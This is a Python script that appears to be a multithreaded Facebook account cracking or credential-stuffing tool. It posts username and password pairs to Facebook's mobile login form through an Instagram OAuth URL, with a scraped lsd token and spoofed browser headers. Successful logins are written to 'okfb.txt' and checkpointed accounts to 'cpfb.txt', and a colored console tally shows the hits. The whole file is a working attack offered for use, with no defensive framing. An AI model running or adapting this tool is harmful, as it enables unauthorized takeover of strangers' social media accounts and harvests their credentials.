from bs4 import BeautifulSoup as bs
import requests
import random
import threading
import asyncio
import time

class proses(threading.Thread):
        def __init__(self, i, p):
                threading.Thread.__init__(self)
                self.user = i
                self.status = 0
                self.password = p

        def update(self):
                return (self.status, self.user, self.password)

        def run(self):
                session = requests.session()
                response = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522bjy6yq1o2ldfx96zb751jcmhwv1cua7ycf2udu51u5vx2z19y4bpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De195b552-29b6-44e9-81a4-936e47fd4a84%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522bjy6yq1o2ldfx96zb751jcmhwv1cua7ycf2udu51u5vx2z19y4bpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=http%3A%2F%2Fwww.instagram.com%2F&_rdr')
                html = bs(response.text, "html.parser")
                action = html.find('form', id='login_form')['action']
                form = html.find('form', id='login_form')
                useragent = random.choice(["Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36","Instagram 9.2.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"])
                for i in form:
                      if "lsd" == i.get("name"):
                             isd = i.get('value')
                             break
                session.headers.update({
                            "Host": "m.facebook.com",
                            "x-fb-lsd": isd,
                            "sec-ch-ua-mobile": "?1",
                            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                            "referer": "https://m.facebook.com"+action,
                            "user-agent": useragent,
                            "accept": "*/*",
                            "origin": "https://m.facebook.com",
                            })
                enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), self.password)
                data = {}
                data['email'] = self.user
                data['pass'] = enc_pass
                for input in form:
                        if 'sign_up' == input.get('name') or '_fb_noscript' == input.get('name') or input.get('name') == None:
                                continue
                        else:
                                data[input.get('name')] = input.get('value')
                response = session.post(f"https://m.facebook.com{action}", data=data, allow_redirects=False)
                if 'c_user' in response.cookies:
                       with open("result/okfb.txt","a") as f:
                              f.write(f"{self.user} | {self.password} \n")
                       self.status = 1

                elif "checkpoint" in response.cookies:
                       with open("result/cpfb.txt","a") as f:
                              f.write(f"{self.user} | {self.password} \n")
                       self.status = 2

                else:
                       self.status = 3


async def start(val):
        val.daemon = True
        try:
                val.start()
        except KeyboardInterrupt:
                exit("")

async def result(fas):
        ok = []
        cp = []
        die = []
        while 1:
              for i in fas:
                   status, user, password = i.update()
                   if status != 0:
                         del fas[fas.index(i)]
                         print(f"\r\x1b[32;1m(\x1b[36;1m+\x1b[32;1m) \x1b[36;1mStatus \x1b[30;1m: \x1b[36;1mOK\x1b[32;1m(\x1b[37;1m{len(ok)}\x1b[32;1m) \x1b[31;1m| \x1b[36;1mCP\x1b[32;1m(\x1b[37;1m{len(cp)}\x1b[32;1m) \x1b[31;1m| \x1b[36;1mDIE\x1b[32;1m(\x1b[31;1m{len(die)}\x1b[32;1m)", end="")
                         if status == 1:
                               ok.append(user)
                               print(f"\r\x1b[32;1m(\x1b[36;1mOKEH\x1b[32;1m) \x1b[36;1m{user} \x1b[31;1m| \x1b[36;1m{password}  ", end="\n")
                         elif status == 2:
                               cp.append(user)
                               print(f"\r\x1b[33;1m(\x1b[30;1mCEPE\x1b[33;1m) \x1b[30;1m{user} \x1b[31;1m| \x1b[30;1m{password} ", end="\n")
                         else:
                               die.append(user)

              try:
                      if threading.activeCount() == 1:
                             break
              except KeyboardInterrupt:
                      exit("")

async def multi(use, fas):
        task = []
        for _ in fas:
                asyncio.ensure_future(start(_))
                await asyncio.sleep(0.1)
        asyncio.ensure_future(result(fas))
        await asyncio.gather(*task,return_exceptions=True)
